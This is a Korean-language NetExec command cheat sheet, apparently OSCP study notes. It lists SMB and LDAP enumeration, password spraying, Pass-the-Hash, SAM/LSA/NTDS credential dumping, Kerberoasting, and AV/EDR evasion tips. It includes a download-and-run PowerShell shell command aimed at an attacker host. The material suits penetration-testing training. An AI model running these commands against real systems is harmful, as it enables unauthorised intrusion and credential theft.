# NetExec (nxc)

## 개요

`nxc` (NetExec)는 SMB, WinRM, LDAP, SSH, FTP, RDP, MSSQL 등 여러 프로토콜을 하나의 CLI로 다루는 열거·공격 도구다.
구 CrackMapExec(CME)의 후속 도구로, OSCP AD 세트에서 SMB 익명 열거, 크리덴셜 스프레이, Pass-the-Hash, 원격 명령 실행에 주로 쓴다.

## 설치

```bash
# Kali (apt)
sudo apt update
sudo apt install netexec

# pipx (격리 설치, 최신 버전)
pipx install netexec

# GitHub 최신
pipx install git+https://github.com/Pennyw0rth/NetExec

# 확인
nxc --version
```

`crackmapexec` 명령이 남아 있는 환경에서는 `crackmapexec`도 nxc로 연결되는 경우가 있다. 새로 쓸 때는 `nxc`를 직접 쓴다.

## 기본 문법

```bash
nxc <프로토콜> <대상> [인증 옵션] [기능 옵션]
# 대상은 IP, CIDR, 호스트명, 또는 파일(-f) 가능
nxc smb 10.10.10.10
nxc smb 10.10.10.0/24
nxc smb targets.txt
```

## 프로토콜 선택

```bash
nxc smb     # SMB (445/139) — 공유·사용자·RID 열거, PtH, 명령 실행
nxc winrm   # WinRM (5985/5986) — 원격 명령 실행
nxc ldap    # LDAP (389/636) — AD 사용자·그룹·Kerberoast 등
nxc ssh     # SSH
nxc ftp     # FTP
nxc rdp     # RDP
nxc mssql   # MSSQL
```

## 인증 옵션

```bash
# 널 세션 (익명)
nxc smb <IP> -u '' -p ''

# 단일 자격 증명
nxc smb <IP> -u <USER> -p <PASS>

# 도메인 지정 (둘 중 하나)
nxc smb <IP> -u <USER> -p <PASS> -d <DOMAIN>
nxc smb <IP> -u <DOMAIN>\\<USER> -p <PASS>

# 로컬 계정으로 인증 (도메인 컨트롤러가 아닌 일반 서버)
nxc smb <IP> -u <USER> -p <PASS> --local-auth

# Pass-the-Hash (NTLM 해시만으로 인증)
nxc smb <IP> -u <USER> -H <NTLM_HASH>

# 사용자/비밀번호 목록 파일
nxc smb <IP> -u users.txt -p passwords.txt

# 1:1 매핑 (spray가 아닌 짝 매칭)
nxc smb <IP> -u users.txt -p passwords.txt --no-bruteforce

# 성공해도 계속 진행
nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success

# 포트 지정
nxc smb <IP> --port 445
```

## SMB

### SMB 열거

```bash
# 공유 목록과 접근 권한
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u <USER> -p <PASS> --shares

# 사용자·그룹·컴퓨터 열거
nxc smb <IP> -u <USER> -p <PASS> --users
nxc smb <IP> -u <USER> -p <PASS> --groups
nxc smb <IP> -u <USER> -p <PASS> --computers

# RID Brute-force (사용자·그룹 이름 수집)
nxc smb <IP> -u <USER> -p <PASS> --rid-brute
nxc smb <IP> -u <USER> -p <PASS> --rid-brute 10000

# 암호 정책
nxc smb <IP> -u <USER> -p <PASS> --pass-pol

# 로그온 세션·디스크
nxc smb <IP> -u <USER> -p <PASS> --sessions
nxc smb <IP> -u <USER> -p <PASS> --disks
nxc smb <IP> -u <USER> -p <PASS> --loggedon-users

# 널 세션으로 RID/사용자 열거 시도
nxc smb <IP> -u '' -p '' --rid-brute
```

### SMB 명령 실행

```bash
# cmd 명령 실행
nxc smb <IP> -u <USER> -p <PASS> -x "whoami"
nxc smb <IP> -u <USER> -p <PASS> -x "ipconfig /all"

# PowerShell 명령 실행
nxc smb <IP> -u <USER> -p <PASS> -X "Get-Process"

# 실행 방식 지정 (wmi, smbexec, atexec, mmcexec)
nxc smb <IP> -u <USER> -p <PASS> -x "whoami" --exec-method smbexec
nxc smb <IP> -u <USER> -p <PASS> -x "whoami" --exec-method wmi

# 출력 숨김 (조용히 실행)
nxc smb <IP> -u <USER> -p <PASS> -x "whoami" --no-output
```

### SMB 크리덴셜 덤프

```bash
# SAM 덤프 (로컬 계정 해시)
nxc smb <IP> -u <USER> -p <PASS> --sam

# LSA 덤프
nxc smb <IP> -u <USER> -p <PASS> --lsa

# NTDS 덤프 (도메인 컨트롤러, DCSync)
nxc smb <DC_IP> -u <USER> -p <PASS> --ntds
nxc smb <DC_IP> -u <USER> -p <PASS> --ntds --user <TARGET_USER>

# DPAPI
nxc smb <IP> -u <USER> -p <PASS> --dpapi
```

### SMB 모듈 (-M)

```bash
# 모듈 목록 보기
nxc smb -L

# 모듈 실행
nxc smb <IP> -u <USER> -p <PASS> -M <module>

# 자주 쓰는 모듈
nxc smb <IP> -u <USER> -p <PASS> -M spider -o SHARE=<SHARE_NAME>
nxc smb <IP> -u <USER> -p <PASS> -M lsassy
nxc smb <IP> -u <USER> -p <PASS> -M mimikatz
nxc smb <IP> -u <USER> -p <PASS> -M gpp_password
nxc smb <IP> -u <USER> -p <PASS> -M gpp_autologin
nxc smb <IP> -u <USER> -p <PASS> -M web_delivery -o URL=http://<ATTACKER_IP>/payload

# 모듈 옵션 확인
nxc smb -M spider --options
```

### SMB 파일 탐색 (spider)

```bash
# 공유 내 파일 목록 재귀 탐색
nxc smb <IP> -u <USER> -p <PASS> -M spider -o SHARE=<SHARE_NAME>

# 특정 폴더부터
nxc smb <IP> -u <USER> -p <PASS> -M spider -o SHARE=<SHARE_NAME> FOLDER=\\

# 특정 확장자/키워드 필터
nxc smb <IP> -u <USER> -p <PASS> -M spider -o SHARE=<SHARE_NAME> PATTERN=.txt
```

## WinRM

```bash
# 명령 실행
nxc winrm <IP> -u <USER> -p <PASS> -x "whoami"
nxc winrm <IP> -u <USER> -p <PASS> -X "Get-Process"

# Pass-the-Hash
nxc winrm <IP> -u <USER> -H <NTLM_HASH> -x "whoami"

# 크리덴셜 스프레이 (WinRM 로그인 가능 계정 찾기)
nxc winrm <IP> -u users.txt -p passwords.txt
```

## LDAP

```bash
# 사용자·그룹·컴퓨터 열거
nxc ldap <IP> -u <USER> -p <PASS> --users
nxc ldap <IP> -u <USER> -p <PASS> --groups
nxc ldap <IP> -u <USER> -p <PASS> --computers

# AS-REP Roastable 계정 (Pre-Auth 불필요)
nxc ldap <IP> -u <USER> -p <PASS> --asreproast asrep.txt

# Kerberoastable 계정 (SPN 보유)
nxc ldap <IP> -u <USER> -p <PASS> --kerberoasting kerb.txt

# BloodHound 수집
nxc ldap <IP> -u <USER> -p <PASS> --bloodhound --collection All

# GMSA 계정 비밀번호 덤프
nxc ldap <IP> -u <USER> -p <PASS> --gmsa

# 특정 속성/필터
nxc ldap <IP> -u <USER> -p <PASS> --trusted-for-delegation
nxc ldap <IP> -u <USER> -p <PASS> --password-not-required
nxc ldap <IP> -u <USER> -p <PASS> --admin-count
```

## SSH / FTP / RDP / MSSQL

```bash
# SSH
nxc ssh <IP> -u <USER> -p <PASS>
nxc ssh <IP> -u users.txt -p passwords.txt

# FTP
nxc ftp <IP> -u <USER> -p <PASS>

# RDP (로그인 가능 여부 확인)
nxc rdp <IP> -u <USER> -p <PASS>

# MSSQL
nxc mssql <IP> -u <USER> -p <PASS>
nxc mssql <IP> -u <USER> -p <PASS> -x "whoami"
nxc mssql <IP> -u <USER> -p <PASS> --query "SELECT name FROM master.dbo.sysdatabases"
```

## 크리덴셜 스프레이

```bash
# SMB 스프레이 (사용자 목록 x 단일 비밀번호)
nxc smb <IP> -u users.txt -p 'Winter2024!' --continue-on-success

# 여러 비밀번호 시도
nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success

# WinRM/RDP로 로그인 가능 계정 필터링
nxc winrm <IP> -u users.txt -p passwords.txt
nxc rdp <IP> -u users.txt -p passwords.txt
```

spray 시 계정 잠금 정책에 주의한다. `--continue-on-success`로 성공 계정을 계속 수집한다.

## 출력·로그

```bash
# 상세 출력
nxc smb <IP> -u <USER> -p <PASS> -v

# 디버그
nxc smb <IP> -u <USER> -p <PASS> --debug

# 결과를 파일로 저장
nxc smb <IP> -u <USER> -p <PASS> --log nxc_result.txt

# JSON 출력
nxc smb <IP> -u <USER> -p <PASS> --json
```

로그는 기본적으로 `~/.nxc/logs/`와 `~/.nxc/workspaces/`에 저장된다.

## 실전 예시

```bash
# 1. 익명 SMB 열거 (가장 먼저)
nxc smb 10.10.10.10 -u '' -p '' --shares

# 2. 서브넷 전체 SMB 스캔 + 공유 열거
nxc smb 10.10.10.0/24 --shares

# 3. 유효 계정으로 사용자·RID 열거
nxc smb 10.10.10.10 -u user -p pass --users --rid-brute

# 4. Pass-the-Hash로 공유 접근
nxc smb 10.10.10.10 -u administrator -H a9fdfa038c4b75ebc76dc855dd74f0da --shares

# 5. 원격 명령 실행으로 셸 획득
nxc smb 10.10.10.10 -u user -p pass -x "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"

# 6. DC에서 NTDS 덤프
nxc smb 10.10.10.10 -u admin -p pass --ntds

# 7. LDAP로 Kerberoast 수집
nxc ldap 10.10.10.10 -u user -p pass --kerberoasting kerb.txt

# 8. WinRM 로그인 가능 계정 찾기 후 명령 실행
nxc winrm 10.10.10.10 -u users.txt -p passwords.txt
nxc winrm 10.10.10.10 -u found_user -p found_pass -x "whoami"
```

## OSCP 팁

- SMB가 열려 있으면 가장 먼저 `nxc smb <IP> -u '' -p '' --shares`로 익명 접근을 확인한다.
- 유효 계정을 얻으면 `--rid-brute`로 사용자 목록을 확장하고, WinRM/RDP 로그인 가능 계정을 찾는다.
- NTLM 해시만 얻었을 때는 `-H`로 Pass-the-Hash를 시도한다. SMB 서명이 꺼져 있으면 릴레이도 고려한다.
- 명령 실행은 `smbexec`가 기본이며, AV/EDR가 있으면 `wmi`나 `atexec`로 바꿔 본다.
- 모듈(`-M`)은 `nxc smb -L`로 먼저 목록을 확인하고, spider/lsassy/gpp_password부터 쓴다.
- nxc와 smbclient/smbmap/enum4linux는 상호 보완이다. nxc로 빠르게 스캔하고, 파일 다운로드는 smbclient로 한다.
- spray 시 계정 잠금 정책(보통 5~10회 실패 시 잠금)을 고려해 `--continue-on-success`와 소규모 목록을 사용한다.